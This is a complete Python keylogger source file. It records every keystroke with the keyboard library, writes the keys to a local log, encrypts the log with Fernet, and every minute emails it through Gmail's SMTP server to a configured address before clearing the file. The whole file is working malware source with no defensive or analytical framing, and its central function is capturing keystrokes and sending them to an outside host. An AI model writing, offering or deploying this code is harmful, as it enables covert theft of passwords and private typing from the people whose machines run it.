import os
import smtplib
import time
from email.message import EmailMessage
from cryptography.fernet import Fernet
from keyboard import on_press, unhook_all

# Configuration
EMAIL_ADDRESS = os.getenv('KEYLOGGER_EMAIL')  # Set this in your environment variables
EMAIL_PASSWORD = os.getenv('KEYLOGGER_PASSWORD')  # Set this in your environment variables
ENCRYPTION_KEY = os.getenv('KEYLOGGER_ENCRYPTION_KEY') or Fernet.generate_key().decode()
LOG_FILE = "keylog.txt"
SEND_INTERVAL = 60  # in seconds

def encrypt_data(data: str) -> str:
    cipher = Fernet(ENCRYPTION_KEY.encode())
    return cipher.encrypt(data.encode()).decode()

def send_email():
    if not os.path.exists(LOG_FILE):
        return

    with open(LOG_FILE, 'r') as file:
        log_content = file.read()

    if not log_content.strip():
        return

    encrypted_content = encrypt_data(log_content)

    msg = EmailMessage()
    msg['Subject'] = 'Keylogger Report'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg.set_content(f"Encrypted Keylogs:\n\n{encrypted_content}")

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
            print("Email sent successfully!")

    except Exception as e:
        print(f"Failed to send email: {e}")

    # Clear the log file after sending
    open(LOG_FILE, 'w').close()

def log_key(event):
    with open(LOG_FILE, 'a') as file:
        file.write(event.name if len(event.name) == 1 else f'[{event.name}]')
        file.write(' ')

def main():
    print("Keylogger is running... Press CTRL+C to stop.")
    try:
        on_press(log_key)

        while True:
            time.sleep(SEND_INTERVAL)
            send_email()

    except KeyboardInterrupt:
        print("Exiting keylogger...")
        unhook_all()

if __name__ == "__main__":
    main()
